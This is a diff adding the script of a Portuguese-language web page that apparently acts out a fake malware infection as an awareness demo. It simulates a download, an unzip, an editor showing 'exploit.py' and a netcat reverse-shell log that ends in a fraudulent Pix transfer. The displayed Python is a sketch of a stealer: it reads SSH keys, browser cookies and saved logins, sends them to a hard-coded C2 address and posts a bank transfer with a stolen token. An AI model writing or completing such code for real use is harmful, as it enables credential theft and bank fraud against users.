+    w.el.style.zIndex=w.focused?10:1;
+    // no mobile: focused=visível, outros=minimizados
+    if(MOBILE && w.open){
+      w.el.classList.toggle('minimized',!w.focused);
+    }
+  });
+  updateTaskbar();
+}
+
+function resetWins(){
+  Object.values(wins).forEach(w=>{
+    w.open=false; w.focused=false;
+    w.el.classList.remove('open','minimized');
+    w.el.style.zIndex=1;
+  });
+  $('#tbash').textContent='';
+  $('#ecode').textContent='';
+  $('#egutter').textContent='';
+  $('#tnet').textContent='';
+  updateTaskbar();
+}
+
+/* ─────────────────────────────────────────
+   CONTEÚDO DO EDITOR
+───────────────────────────────────────── */
+const PY_LINES=[
+  ['cm','#!/usr/bin/env python3'],
+  ['cm','# exploit.py — stage2 payload'],
+  ['',''],
+  ['kw','import '],['nb','socket'],['kw','import '],['nb','subprocess'],
+  ['kw','import '],['nb','os'],['kw','import '],['nb','base64'],
+  ['kw','import '],['nb','json'],
+  ['',''],
+  ['cm','# ── configuração ──────────────────'],
+  ['st','C2_HOST'],['','  = '],['st','"185.220.101.47"'],
+  ['st','C2_PORT'],['','  = '],['nm','4444'],
+  ['',''],
+  ['kw','def '],['fn','exfil'],['','(data):'],
+  ['','    '],['nb','sock'],['','.sendall('],['nb','json'],['','.dumps(data).encode())'],
+  ['',''],
+  ['kw','def '],['fn','harvest'],['','():'],
+  ['','    paths = ['],
+  ['st','        "~/.ssh/id_rsa"'],
+  ['st','        "~/.config/chromium/Default/Cookies"'],
+  ['st','        "~/.mozilla/firefox/*/logins.json"'],
+  ['','    ]'],
+  ['','    data = {}'],
+  ['kw','    for '],['','p '],['kw','in '],['','paths:\n        '],
+  ['kw','try'],['',':\n            with '],
+  ['nb','open'],['','(p) '],['kw','as '],['','f:\n                data[p] = f.read()\n        '],
+  ['kw','except'],['',': '],['kw','pass'],
+  ['kw','    return '],['','data'],
+  ['',''],
+  ['kw','def '],['fn','pivot_bank'],['','(token):'],
+  ['','    '],['cm','# injetar token e disparar Pix'],
+  ['','    headers = {'],['st','"Authorization"'],['',''],
+  ['','                : '],['st','"Bearer "'],['','+ token}'],
+  ['','    '],['nb','requests'],['','.post('],
+  ['st','"https://api.bancoconfianca[.]br/v2/pix/transfer"'],
+  ['',',\n        headers=headers,\n        json={'],
+  ['st','"valor"'],['',': balance(),'],
+  ['st','"chave"'],['',': '],['st','"j.silvame@pix"'],
+  ['','})\n'],
+  ['',''],
+  ['kw','if '],['','__name__ == '],['st','"__main__"'],['',':'],
+  ['','    '],['nb','sock'],['','.connect((C2_HOST, C2_PORT))'],
+  ['','    '],['fn','exfil'],['','('],['fn','harvest'],['','())'],
+  ['','    '],['fn','pivot_bank'],['','(harvest_token())'],
+];
+
+async function renderEditor(my){
+  const code=$('#ecode'), gut=$('#egutter');
+  code.textContent=''; gut.textContent='';
+  let lineNum=1;
+  const addLine=()=>{
+    const n=document.createElement('span');
+    n.style.display='block'; n.textContent=lineNum++;
+    gut.appendChild(n);
+  };
+  addLine();
+  for(const [cls,txt] of PY_LINES){
+    check(my);
+    if(txt===''&&cls===''){
+      code.appendChild(document.createElement('br')); addLine();
+      await wait(55); continue;
+    }
+    const parts=txt.split('\n');
+    for(let i=0;i<parts.length;i++){
+      const sp=document.createElement('span');
+      if(cls) sp.className=cls;
+      sp.textContent=parts[i];
+      code.appendChild(sp); scrollBot(code);
+      if(i<parts.length-1){ code.appendChild(document.createElement('br')); addLine(); }
+      await wait(skipping?0:22); check(my);
+    }
+  }
+}
+
+/* ─────────────────────────────────────────
+   BASH
+───────────────────────────────────────── */
+async function runBash(my){
+  const t=$('#tbash'); t.textContent='';
+  const prompt=()=>{
+    appendSpan(t,'\n'); appendSpan(t,'usuario@host','p-green');
+    appendSpan(t,':'); appendSpan(t,'~','p-cyan'); appendSpan(t,'$ ','p-white');
+  };
+  appendSpan(t,'Linux 6.1.0-kali7-amd64  #1 SMP Debian 6.1.20-2kali1\n','p-dim');
+  appendSpan(t,'Last login: Thu Sep  5 23:41:12 2026 from 10.0.0.12\n','p-dim');
+  prompt();
+
+  await wait(200); check(my);
+  await typeInto(t,'unzip -o /tmp/cupom-validador-brinde.zip -d /tmp/stage2/',10); check(my);
+  await wait(160); check(my);
+  appendSpan(t,'\nArchive:  /tmp/cupom-validador-brinde.zip\n','p-dim');
+  for(const f of ['  inflating: /tmp/stage2/exploit.py',
+                   '  inflating: /tmp/stage2/libs/req.so',
+                   '  inflating: /tmp/stage2/libs/crypto.so']){
+    appendSpan(t,f+'\n','p-dim'); await wait(70); check(my);
+  }
+  prompt(); await wait(180); check(my);
+  await typeInto(t,'chmod +x /tmp/stage2/exploit.py',10); check(my);
+  await wait(140); check(my); prompt();
+  await wait(160); check(my);
+  await typeInto(t,'cat /tmp/stage2/exploit.py',10); check(my);
+  await wait(260); check(my);
+  openWin('edit'); focusWin('edit');
+}
+
+/* ─────────────────────────────────────────
+   NETCAT
+───────────────────────────────────────── */
+async function runNetcat(my){
+  const t=$('#tnet'); t.textContent='';
+  appendSpan(t,'# nc — reverse shell listener\n','nc-dim');
+  appendSpan(t,'# ouvindo 0.0.0.0:4444 …\n\n','nc-dim');
+  await wait(300); check(my);
+  appendSpan(t,'[+] ','nc-ok');
+  await typeInto(t,'conexão recebida de 177.x.x.x:52841\n',12); check(my);
+  await wait(160); check(my);
+
+  const steps=[
+    ['nc-ok',  '[+] shell remoto estabelecido\n'],
+    ['nc-dim', '[*] detectando sistema operacional…\n'],
+    ['nc-ok',  '[+] Android 14 / Samsung Galaxy  (uid=10234)\n'],
+    ['nc-dim', '[*] enumerando apps instalados…\n'],
+    ['nc-warn','[!] app bancário detectado: br.com.bancoconfianca.app\n'],
+    ['nc-dim', '[*] extraindo token de sessão…\n'],
+    ['nc-ok',  '[+] token: eyJhbGciOiJSUzI1NiJ9.eyJzdWI…\n'],
+  ];
+  for(const [cls,txt] of steps){
+    appendSpan(t,txt,cls); await wait(skipping?0:160); check(my);
+  }
+  // contagem animada de contatos
+  for(let n=0;n<=312;n+=26){
+    if(t.lastChild) t.lastChild.remove();
+    appendSpan(t,'[*] lendo contatos ('+n+'/312)…\n','nc-dim');
+    if(!skipping){ await wait(40); check(my); } else check(my);
+  }
+  const rest=[
+    ['nc-warn','[!] localização GPS: -23.550, -46.633\n'],
+    ['nc-dim', '[*] abrindo canal de exfil…\n'],
+    ['nc-ok',  '[+] 1,8 MB transferidos\n'],
+    ['nc-dim', '[*] executando pivot bancário…\n'],
+    ['nc-err', '[✓] Pix R$ 9.539,90 → João J. A. S. Silva\n'],
+  ];
+  for(const [cls,txt] of rest){
+    if(skipping) appendSpan(t,txt,cls);
+    else{ await wait(200); check(my); appendSpan(t,txt,cls); }
+  }
+  scrollBot(t);
+}
+
+/* ─────────────────────────────────────────
+   DIÁLOGO FALSO
+───────────────────────────────────────── */
+function showFakeDialog(){
+  return new Promise(res=>{
+    const ov=$('#fake-overlay');
+    ov.classList.add('show');
+    let resolved=false;
+    const done=()=>{
+      if(resolved) return;
+      resolved=true;
+      ov.classList.remove('show');
+      ov.removeEventListener('click', outsideClick);
+      res();
+    };
+    // clicar nos botões resolve
+    $('#fake-yes').onclick=done;
+    $('#fake-no').onclick=done;
+    // clicar FORA do dialog (no overlay) também resolve
+    const outsideClick=(e)=>{ if(e.target===ov) done(); };
+    ov.addEventListener('click', outsideClick);
+    // skip mode fecha imediatamente
+    if(skipping){ setTimeout(done,0); }
+  });
+}
+
+/* ─────────────────────────────────────────
+   SEQUÊNCIA PRINCIPAL
+───────────────────────────────────────── */
+async function sequence(){
+  const my=gen; running=true;
+  $('#hint').classList.add('on');
+
+  /* download */
+  show('dl'); await wait(200); check(my);
+  $('#dlbar').classList.add('up');
+  const fill=$('#dlfill'), sub=$('#dlsub');
+  for(let p=0;p<=100;p+=5){
+    fill.style.width=p+'%';
+    sub.textContent=p<100?p+'% de 4,1 MB · 2 s restantes':'4,1 MB · concluído';
+    await wait(22); check(my);
+  }
+  sub.textContent='Concluído — extraindo arquivos…';
+  await wait(400); check(my);
+
+  /* diálogo de permissão */
+  await showFakeDialog(); check(my);
+
+  /* desktop */
+  skipping=false;
+  show('desk'); await wait(280); check(my);
+
+  openWin('bash');
+  await runBash(my);
+  await wait(skipping?0:600); check(my);
+
+  skipping=false;
+  focusWin('edit');
+  await renderEditor(my); check(my);
+  await wait(skipping?0:400); check(my);
+
+  /* volta ao bash: executa */
+  skipping=false;
+  focusWin('bash');
+  const tb=$('#tbash');
+  appendSpan(tb,'\n');
+  appendSpan(tb,'usuario@host','p-green');
+  appendSpan(tb,':'); appendSpan(tb,'~','p-cyan'); appendSpan(tb,'$ ','p-white');
+  await wait(200); check(my);
+  await typeInto(tb,'python3 /tmp/stage2/exploit.py &',14); check(my);
+  await wait(180); check(my);
+  appendSpan(tb,'\n[1] 14287\n','p-dim');
+  await wait(280); check(my);
+
+  /* netcat */
+  skipping=false;
+  openWin('net'); focusWin('net');
+  await runNetcat(my); check(my);
+  await wait(skipping?0:600); check(my);
+
+  /* comprovante Pix */
+  skipping=false;
+  $('#bank').classList.remove('reveal');
+  (function(){
+    const d=new Date();
+    const fmt=n=>String(n).padStart(2,'0');
+    $('#pix-date').textContent =
+      fmt(d.getDate())+'/'+fmt(d.getMonth()+1)+'/'+d.getFullYear()+', '+
+      fmt(d.getHours())+':'+fmt(d.getMinutes())+':'+fmt(d.getSeconds())+
+      ', via app Banco Confiança';
+  })();
+  show('bank'); await wait(200); check(my);
+  $('#bank').classList.add('reveal');
+  await wait(skipping?0:2500); check(my);
+
+  /* revelação */
+  skipping=false;
+  show('done');
+  $('#hint').classList.remove('on');
+  running=false;
+  startCloseCountdown();
+}
+
+function countTo(el,from,to,ms){
+  const my=gen, t0=performance.now(), dur=ms*CFG.vel;
+  return new Promise(res=>{
+    (function frame(now){
+      if(my!==gen) return res();
+      let k=Math.min(1,(now-t0)/dur);
+      if(skipping) k=1;
+      const e=1-Math.pow(1-k,3);
+      el.textContent=brl(from+(to-from)*e);
+      k<1?requestAnimationFrame(frame):res();
+    })(t0);
+  });
+}
+
+/* ─────────────────────────────────────────
+   START / RESET / CONTROLES
+───────────────────────────────────────── */
+function start(){
+  gen++; skipping=false; flush();
+  MOBILE=isMobile();
+  document.body.classList.toggle('mobile',MOBILE);
+  resetWins();
+  $('#dlbar').classList.remove('up');
+  $('#dlfill').style.width='0';
+  $('#bank').classList.remove('reveal');
+  sequence().catch(e=>{ if(e!==ABORT) console.error(e); });
+}
+
+function reset(){
+  gen++; skipping=false; flush(); running=false;
+  stopCloseCountdown();
+  $('#fake-overlay').classList.remove('show');
+  $('#hint').classList.remove('on');
+  resetWins();
+  $('#dlbar').classList.remove('up');
+  $('#dlfill').style.width='0';
+  $('#bank').classList.remove('reveal');
+  show('portal');
+}
+
+function skip(){
+  if(!running) return;
+  skipping=true;
+  $('#fake-overlay').classList.remove('show');
+  flush();
+}
+
+/* ── fullscreen helper ── */
+function enterFullscreen(){
+  const el=document.documentElement;
+  const req=el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen;
+  if(req) req.call(el).catch(()=>{});
+}
+
+/* ── contador de fechamento na tela de revelação ── */
+let closeTimer=null;
+function startCloseCountdown(){
+  clearInterval(closeTimer);
+  let secs=120;
+  const el=$('#close-countdown');
+  const update=()=>{
+    if(secs<=0){ clearInterval(closeTimer); closeWindow(); return; }
+    const m=Math.floor(secs/60), s=String(secs%60).padStart(2,'0');
+    el.textContent='Esta janela fecha automaticamente em '+m+':'+s;
+    secs--;
+  };
+  update();
+  closeTimer=setInterval(update,1000);
+}
+function stopCloseCountdown(){
+  clearInterval(closeTimer);
+  const el=$('#close-countdown');
+  if(el) el.textContent='';
+}
+function closeWindow(){
+  stopCloseCountdown();
+  // sai do fullscreen antes de fechar
+  if(document.fullscreenElement) document.exitFullscreen();
+  try{ window.close(); } catch(e){}
+  // fallback: vai para about:blank se window.close() for bloqueado
+  setTimeout(()=>{ window.location.href='about:blank'; }, 300);
+}
+
+$('#go').addEventListener('click', ()=>{ enterFullscreen(); start(); });
+$('#again').addEventListener('click', e=>{ e.stopPropagation(); stopCloseCountdown(); reset(); });
+$('#close-btn').addEventListener('click', e=>{ e.stopPropagation(); closeWindow(); });
+document.addEventListener('click', e=>{
+  if(e.target.closest('#go,#again,#close-btn,.wtb-btns,#fake-overlay')) return;
+  skip();
+});
+document.addEventListener('keydown', e=>{
+  if(e.code==='Space'||e.code==='ArrowRight'){ e.preventDefault(); skip(); }
+  if(e.key==='r'||e.key==='R') reset();
+  if(e.key==='Escape' && !document.fullscreenElement) reset();
+  if(e.key==='f'||e.key==='F'){
+    document.fullscreenElement?document.exitFullscreen()
+                              :document.documentElement.requestFullscreen?.();
+  }
+});
+</script>
+</body>
+</html>
